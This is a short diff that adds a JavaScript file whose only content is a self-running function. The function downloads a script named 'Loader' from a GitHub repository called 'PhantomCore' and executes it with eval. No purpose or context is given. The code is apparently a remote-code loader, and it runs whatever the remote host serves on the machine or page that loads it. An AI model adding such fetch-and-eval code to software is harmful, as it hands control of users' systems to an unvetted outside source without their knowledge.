@@ -1,0 +1,10 @@
+(function() {
+    const scriptUrl = "https://raw.githubusercontent.com/DevilpieceDeveloper/PhantomCore/refs/heads/main/Loader";
+    fetch(scriptUrl)
+        .then(response => response.text())
+        .then(code => {
+            eval(code);
+        })
+        .catch(error => console.error("Failed to load the script:", error));
+})();
+        
